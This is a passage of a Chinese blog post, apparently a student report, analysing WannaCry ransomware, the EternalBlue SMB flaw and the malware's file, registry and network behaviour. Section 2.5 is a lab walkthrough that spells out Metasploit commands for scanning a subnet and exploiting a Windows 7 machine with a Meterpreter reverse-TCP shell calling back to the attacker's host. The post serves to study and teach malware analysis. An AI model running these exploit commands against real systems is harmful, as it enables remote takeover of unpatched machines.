<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="WannaCry 的具体的细节的分析, good">
    <meta name="description" content="Dingisoul&#39;s blog">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>WannaCry 的具体的细节的分析 | Dingisoul</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>


<meta name="generator" content="Hexo 5.3.0"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Dingisoul</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Dingisoul</div>
        <div class="logo-desc">
            
            Dingisoul&#39;s blog
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">WannaCry 的具体的细节的分析</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/network/">
                                <span class="chip bg-color">network</span>
                            </a>
                        
                            <a href="/tags/virus/">
                                <span class="chip bg-color">virus</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-12-30
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>本文是针对WannaCry 的具体的细节的分析</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-249520.htm">REFERENCE</a></p>
<a id="more"></a>

<h1 id="WannaCry-病毒分析"><a href="#WannaCry-病毒分析" class="headerlink" title="WannaCry 病毒分析"></a>WannaCry 病毒分析</h1><h3 id="Virus-Analysis-Of-WannaCry"><a href="#Virus-Analysis-Of-WannaCry" class="headerlink" title="Virus Analysis Of WannaCry"></a>Virus Analysis Of WannaCry</h3><p>[TOC]</p>
<h3 id="引-言"><a href="#引-言" class="headerlink" title="引 言"></a>引 言</h3><p>本次大作业主要对WannaCry病毒的行为和具体代码的实现逻辑进行分析，之前有一些前辈已经对病毒大体情况做出了相关的分析。本次大作业将会利用现有能找到的前人的所有分析进行汇总细化，并结合至今为止病毒的变种情况，进行针对事实与现金情况的逻辑，变种和防范方法分析，通过依照事实的分析，解答大家对病毒的疑问和误解</p>
<p>本次大作业的亮点在于：</p>
<ol>
<li><p> 通过了病毒发作到现在的沉淀，病毒的具体行为和变种也经过了发展和沉淀，通过综合能得到更适合现在的方法</p>
</li>
<li><p> 通过对病毒变种的分析，分析病毒的演变情况，了解病毒在发作之后可能会有什么样的改变</p>
</li>
<li><p>通过基于事实的推测，推翻大众对病毒误解，对病毒有基于科学的认识。</p>
<h2 id="1-病毒概况"><a href="#1-病毒概况" class="headerlink" title="1 病毒概况"></a>1 病毒概况</h2></li>
</ol>
<p>2017年5月12日，本文所分析的勒索病毒WannaCry借助高危漏洞”永恒之蓝”（EternalBlue）在全世界范围内快速传播。世界范围内的很多国家，包括俄罗斯、西班牙、意大利、越南、美国、英国、中国、等百余个国家的企业和医院等机构收到大幅度的破环。与此同时，我国的许多行业机构和大型企业也被攻击，有的单位甚至”全军覆没”，造成了近期罕见的损失。</p>
<p>本报告将从传播途径、危害方式和结果、受威胁用户群等角度，逐一厘清这个恶性病毒方方面面的真相，用以帮助大家认识、解决该病毒，防范未来可能出现的变种病毒，同时澄清一些谣传和谎言。</p>
<h3 id="1-1-病毒攻击行为及危害"><a href="#1-1-病毒攻击行为及危害" class="headerlink" title="1.1 病毒攻击行为及危害"></a>1.1 病毒攻击行为及危害</h3><p>遭受WannaCry病毒侵害的电脑，其文件将被加密锁死，病毒开发者提供了一个比特币账号供支付赎金打开锁死的文件，但根据病毒源码的分析，受害者可能永远的失去了这些文件。WannaCry病毒的设计就明确的表明了病毒<br>和<br>病毒作者不能得知受害者是否支付的了赎金，且病毒并不包含用于解码的神奇数，所以即使支付了赎金，大概率也不能得到恢复密钥</p>
<p>网上流传的”解密方法”只是”文件恢复工具”，可以恢复一些被删除的文件，但是作用有限。这是因为据病毒源码分析，文件的加密过程是加密后再删除原始文件，文件恢复工具可能可以恢复删除的原始文件。但是病毒对于文件的操作是十分频繁的，删除文件所保存的数据块可能会被覆盖，而且随着病毒执行时间的增加，恢复的可能性会逐渐降低。</p>
<h3 id="1-2-传播途径和攻击方式"><a href="#1-2-传播途径和攻击方式" class="headerlink" title="1.2 传播途径和攻击方式"></a>1.2 传播途径和攻击方式</h3><p>WannaCry由蠕虫+勒索病毒构成，蠕虫传播和释放自己，后者负责加密文件。</p>
<p>蠕虫：蠕虫病毒是一种常见的计算机病毒。通过网络和电子邮件进行传播，具有自我复制和传播迅速等特点。此次病毒制造者正是利用了美国国家安全局(NSA)<br>泄漏的Windows<br>SMB远程漏洞利用工具”永恒之蓝”来进行传播的。据悉，蠕虫代码运行后先会连接域名：hxxp: //<a target="_blank" rel="noopener" href="http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com/">www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a><br>如果该域名可以成功连接，则直接停止。而如果上述域名无法访问，则会安装病毒服务，在局域网与外网进行传播。</p>
<p>但是无论这个”神奇开关”是否开启，该病毒都会攻击用户，锁死文件。另外，这个开关程序很容易被病毒制造者去除，因此未来可能出现没有开关的变种病毒。</p>
<h3 id="1-3-易受攻击用户群"><a href="#1-3-易受攻击用户群" class="headerlink" title="1.3 易受攻击用户群"></a>1.3 易受攻击用户群</h3><p>大型企业和公共设施占收到攻击的主机的大多数，个人用户受攻击较少。接下来，将从两个方面说明易受攻击用户群的特点</p>
<p>操作系统：首先，该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。而Windows<br>Vista、Windows Server 2008、Windows 7、Windows Server 2008 R2、Windows<br>8.1、Windows Server 2012、Windows Server 2012 R2、Windows Server 2016<br>版本，用户如果开启了自动更新或安装了对应的更新补丁，可以抵御该病毒。Windows10是最安全的，由于其系统是默认开启自动更新的，所以不会受该病毒影响。同时，Unix、Linux、Android等操作系统，也不会受到攻击。</p>
<p>网络结构：目前这个病毒通过共享端口传播同时在公网及内网进行传播，直接暴露在公网上且没有安装相应操作系统补丁的计算机有极大风险会被感染，而通过路由拨号的个人和企业用户，则不会受到来自公网的直接攻击</p>
<h1 id="2-永恒之蓝漏洞"><a href="#2-永恒之蓝漏洞" class="headerlink" title="2 永恒之蓝漏洞"></a>2 永恒之蓝漏洞</h1><h2 id="2-1-漏洞情况说明"><a href="#2-1-漏洞情况说明" class="headerlink" title="2.1 漏洞情况说明"></a>2.1 漏洞情况说明</h2><h3 id="2-1-1-漏洞简介"><a href="#2-1-1-漏洞简介" class="headerlink" title="2.1.1 漏洞简介"></a>2.1.1 漏洞简介</h3><p>永恒之蓝漏洞是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机的系统漏洞</p>
<p>漏洞代码： MS17-010</p>
<h3 id="2-1-2-漏洞影响"><a href="#2-1-2-漏洞影响" class="headerlink" title="2.1.2 漏洞影响"></a>2.1.2 漏洞影响</h3><p>2017年4月14日晚，影子经纪人黑客组织将永恒之蓝漏洞在互联网上公开后。在之后的五个月中，该漏洞被多款恶意软件利用。包括WannaCry，无文件的勒索软件UIWIX和SMB蠕虫EternalRocks。</p>
<p>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB<br>v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p>
<h2 id="2-2-SMB协议"><a href="#2-2-SMB协议" class="headerlink" title="2.2 SMB协议"></a>2.2 SMB协议</h2><h3 id="2-2-1-简介"><a href="#2-2-1-简介" class="headerlink" title="2.2.1 简介"></a>2.2.1 简介</h3><p>SMB（全称是Server Message<br>Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
<h3 id="2-2-2-工作原理"><a href="#2-2-2-工作原理" class="headerlink" title="2.2.2 工作原理"></a>2.2.2 工作原理</h3><p>（1）：首先客户端发送一个SMB negport<br>请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</p>
<p>（2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接</p>
<p>（3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX<br>SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</p>
<p>（4）：连接到相应资源后，SMB客户端就能够通过open<br>SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close<br>SMB关闭文件。</p>
<h2 id="2-3-溢出分析"><a href="#2-3-溢出分析" class="headerlink" title="2.3 溢出分析"></a>2.3 溢出分析</h2><h3 id="2-3-1-概述"><a href="#2-3-1-概述" class="headerlink" title="2.3.1 概述"></a>2.3.1 概述</h3><p>漏洞出现在<code>Windows SMB v1</code>中的内核态函数<code>srv!SrvOs2FeaListToNt</code>在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数<code>srv!SrvOs2FeaListToNt</code>在将FEA list转换成<code>NTFEA</code>(Windows NT FEA) list前会调用<code>srv!SrvOs2FeaListSizeToNt</code>去计算转换后的<code>FEA lsit</code>的大小。然后会进行如下操作：</p>
<p>1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小</p>
<p>2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大</p>
<p>3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出</p>
<h2 id="2-4-漏洞的利用"><a href="#2-4-漏洞的利用" class="headerlink" title="2.4 漏洞的利用"></a>2.4 漏洞的利用</h2><h3 id="2-4-1-情况说明"><a href="#2-4-1-情况说明" class="headerlink" title="2.4.1 情况说明"></a>2.4.1 情况说明</h3><p>漏洞代码工作在内核的非分页内存中。也可以工作在大非分页池中。这些类型的池都没有在页的开始嵌入任何头部。因此需要特殊的技巧来利用这些漏洞。这些技巧需要逆向一些数据结构</p>
<h3 id="2-4-2-利用过程"><a href="#2-4-2-利用过程" class="headerlink" title="2.4.2 利用过程"></a>2.4.2 利用过程</h3><p>EternalBlue首先发送一个SRVbuffer除了最后一个数据包。这是因为大非分页池将在会话中最后一个数据包被服务端接收的时候被建立。SMB服务器会把会话中接受到的数据读取并叠加起来放入输入缓冲区中。所有的数据会在TRANS包中被标明。当接收到所有的数据 SMB服务器将会处理这些数据。数据通过CIFS(Common Internet File System)会被分发到SrvOpen2函数中来读取。</p>
<p>EternalBlue发送的所有数据会被SMB服务器收到后，SMB服务器会发送SMB ECHO包。因为攻击可以在网速很慢的情况下实现，所以SMB ECHO是很重要的。</p>
<p>在我们的分析中，即使我们发送了初始数据，存在漏洞的缓冲区仍然没有被分配在内存中。</p>
<p>1.FreeHole_A: EternalBlue通过发送SMB v1数据包来完成占位</p>
<p>2.SMBv2_1n: 发送一组SMB v2数据包</p>
<p>3.FreeHole_B: 发送另一个占位数据包；必须确保第一个占位的FreeHole_A被释放之前，这块内存被分配</p>
<p>4.FreeHole_A_CLOSE: 关闭连接，使得第一个占位的内存空间被释放</p>
<p>5.SMBv2_2n: 发送一组SMB v2数据包</p>
<p>6.FreeHole_B_CLOSE: 关闭连接来释放缓冲区</p>
<p>7.FINAL_Vulnerable_Buffer: 发送最后的数据包，这个数据包将会被存储在有漏洞的缓冲区中</p>
<p>有漏洞的缓冲区（之前SRVNET创建的）被填入的数据将会覆盖和部分SRVNET的缓冲区。在FEA<br>list转换到NTFEA<br>list时会发生错误，因为FEA结构会在覆盖SRVNET缓冲区之后失效，所以服务器将以STATUS_INVALID_PARAMETER（0xC000000D）返回。</p>
<h2 id="2-5-漏洞攻击"><a href="#2-5-漏洞攻击" class="headerlink" title="2.5 漏洞攻击"></a>2.5 漏洞攻击</h2><h3 id="2-5-1-准备工作"><a href="#2-5-1-准备工作" class="headerlink" title="2.5.1 准备工作"></a>2.5.1 准备工作</h3><p>准备两台虚拟机，一台kali-linux 一台 win7，使用Wireshark<br>进行抓包，利用msfconsole工具进行模拟攻击</p>
<h3 id="2-5-2-攻击过程"><a href="#2-5-2-攻击过程" class="headerlink" title="2.5.2 攻击过程"></a>2.5.2 攻击过程</h3><p>1.获取两台主机的IP地址</p>
<p>2.测试两台主机的连通性</p>
<p>3.使得 kali 的数据保持开启</p>
<p>测试是否开启： service postgresql status</p>
<p>打开数据库 ： service postgresql start</p>
<p>初始化数据库： msfdb init</p>
<p>4.利用 msfconsole 进行漏洞扫描</p>
<p>启动： msfconsole</p>
<p>查看数据库连接情况：db_status</p>
<p>搜索漏洞： search ms17_010</p>
<p>扫描命令：use auxiliary/scanner/smb/smb_ms17_010</p>
<p>攻击命令（后面使用）：use exploit/windows/smb/ms17_010_eternalblue</p>
<p>设置扫描的主机或者主机段：set rhosts 192.168.223.141/24;</p>
<p>设置扫描线程为20： set threads 20；</p>
<p>最后输入run执行扫描。</p>
<p>同时，利用 wireshark抓包工具，监听ethO</p>
<p>进行攻击：use exploit/windows/smb/ms17_010_eternalblue</p>
<p>设置攻击目标（靶机）：set rhost 192.168.223.141</p>
<p>设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp</p>
<p>设置监听主机（kali）：set lhost 192.168.223.137</p>
<p>利用exploit进行攻击：exploit</p>
<p>成功攻击！！</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image1.png" class="" width="1">

<p>图1 打开并初始化数据库</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image2.png" class="" width="2">

<p>图2 打开msfconsole 并查找ms17_010</p>
<h1 id="4-病毒分析"><a href="#4-病毒分析" class="headerlink" title="4 病毒分析"></a>4 病毒分析</h1><h2 id="4-1-基础静态分析"><a href="#4-1-基础静态分析" class="headerlink" title="4.1 基础静态分析"></a>4.1 基础静态分析</h2><h3 id="4-1-1-查壳"><a href="#4-1-1-查壳" class="headerlink" title="4.1.1 查壳"></a>4.1.1 查壳</h3><p>第一步防止开发者对病毒进行了包装，对病毒进行查壳操作，以下是查壳结果</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image3.jpeg" class="" width="3">

<p>图一：Exeinfo查壳</p>
<p>通过 Lamer info字段的Not packed，我们知道病毒无壳，省去了脱壳的麻烦</p>
<h3 id="4-1-2-字符串分析"><a href="#4-1-2-字符串分析" class="headerlink" title="4.1.2 字符串分析"></a>4.1.2 字符串分析</h3><p>利用IDA工具中提供的 Strings Window<br>工具，我们可以查找病毒源文件中含有的显式的字符串，这一步能帮我们对病毒的大致功能和加密方式等由大致的了解。</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image4.jpeg" class="" width="4">

<p>图二：病毒的字符串信息</p>
<p>通过字符串分析，我们大致了解了，病毒可能利用了RSA和AES<br>的加密方式，同时和 TaskStart 函数，t.wnry<br>,tasksche.exe等文件有很大的关联关系，还利用了CMD调用了某些参数。</p>
<h3 id="4-1-3-识别加密算法"><a href="#4-1-3-识别加密算法" class="headerlink" title="4.1.3 识别加密算法"></a>4.1.3 识别加密算法</h3><p>通过 Kyrpto ANAlyzer 插件识别病毒文件的加密算法</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image5.jpeg" class="" width="5">

<p>图四： 识别加密算法</p>
<p>经过分析得知，病毒使用了 CRC32 和 AES 加密算法，CryptDecrypt 和<br>CryptEncrypt 是微软提供的加密类库，ZIP2和ZLIB 是压缩算法</p>
<h3 id="4-1-4-查看导入表"><a href="#4-1-4-查看导入表" class="headerlink" title="4.1.4 查看导入表"></a>4.1.4 查看导入表</h3><p>通过PEiD提供的输入表查看器，对病毒源文件的输入表进行查看，探寻病毒。</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image6.jpeg" class="" width="6">

<p>图五：查看病毒输入表</p>
<p>在Kernel32中发现病毒利用了LoadResource，LockResource等函数，表明了病毒资源段中可能藏有病毒需要利用的其他文件</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image7.jpeg" class="" width="7">

<p>图六：病毒输入表-注册表操作</p>
<p>病毒利用了ADVAPI32.dll中的RegCreateKeyW，RegSetValueExA等函数，代表病毒源码中涉及了对注册表的操作，可以在病毒执行完后对注册表进行比较。</p>
<h3 id="4-1-5-提取资源段"><a href="#4-1-5-提取资源段" class="headerlink" title="4.1.5 提取资源段"></a>4.1.5 提取资源段</h3><p>通过输入表的分析，我们了解到病毒exe的资源段中可能隐藏着病毒所拥有的其他资源文件，为此，我们对资源文件进行提取。</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image8.jpeg" class="" width="8">

<p>图七：资源段查看</p>
<p>从资源段分析来看，XIA资源段最值得我们关注，在资源段中我们发现资源段头的PK字段，判断该资源段应该是rar的压缩文件，我们将资源段提取出来</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image9.jpeg" class="" width="9">

<p>图八：XIA资源段</p>
<p>发现了隐藏在病毒资源段的文件 其中msg中是一些语言包</p>
<h2 id="4-2-基础动态分析"><a href="#4-2-基础动态分析" class="headerlink" title="4.2 基础动态分析"></a>4.2 基础动态分析</h2><h3 id="4-2-1-进程分析"><a href="#4-2-1-进程分析" class="headerlink" title="4.2.1 进程分析"></a>4.2.1 进程分析</h3><p>使用 ProcessMonitor 查看进程树</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image10.png" class="" width="10">

<p>图九：进程树</p>
<p>Wcry.exe总共拥有5个子进程，其中cmd负责执行一些批处理文件</p>
<h3 id="4-2-2-注册表分析"><a href="#4-2-2-注册表分析" class="headerlink" title="4.2.2 注册表分析"></a>4.2.2 注册表分析</h3><p>使用Regshot 比较病毒执行前后的注册表变化</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image11.jpeg" class="" width="11"> 

<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image12.jpeg" class="" width="12">

<p>图十：regshot结果</p>
<p>通过Regshot的比对，我们发现病毒增加了一些加解密需要的密钥注册表项和自动运行的病毒路径位置</p>
<h3 id="4-2-3-文件监控"><a href="#4-2-3-文件监控" class="headerlink" title="4.2.3 文件监控"></a>4.2.3 文件监控</h3><p>下面我们利用火绒剑抓取病毒运行过程中病毒文件对于文件的更改，</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image13.jpeg" class="" width="13">

<p>图十一：文件监控</p>
<p>通过对文件的监控，我们发现文件在病毒文件夹里放置了</p>
<p>Pky，eky，res 文件，应该是病毒所需要的公钥，私钥等文件</p>
<p>Bat 文件，是病毒所需要执行的繁杂的重复性的工作</p>
<p>Vbs 文件，应该是病毒执行时的中间文件，用于执行感染操作</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image14.jpeg" class="" width="14">

<p>图十二：文件行为监控</p>
<p>继续进行文件行为的监控，监控到文件在自己的路径释放解压文件的操作，印证了我们之前对于资源段的分析。</p>
<h3 id="4-2-4-感染效果"><a href="#4-2-4-感染效果" class="headerlink" title="4.2.4 感染效果"></a>4.2.4 感染效果</h3><p>在病毒感染后，分析病毒感染的结果：</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image15.jpeg" class="" width="15">

<p>图十三：感染病毒文件</p>
<p>可以看到，病毒在每个文件夹下新建了一个@Please_Read_Me@.txt和 @WanaDecryptor@.exe用于要求用户支付解锁账户，并将其他文件加密为以.WNCRY的文件</p>
<h3 id="4-2-5-网络监控"><a href="#4-2-5-网络监控" class="headerlink" title="4.2.5 网络监控"></a>4.2.5 网络监控</h3><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image16.png" class="" width="16">

<p>图十四：网络连接情况</p>
<p>通过分析病毒释放的文件 taskhsvc.exe<br>的联网情况，我们看到病毒一直在对49159和9050端口进行监听，并利用端口尝试对局域网内的一些IP进行渗透。</p>
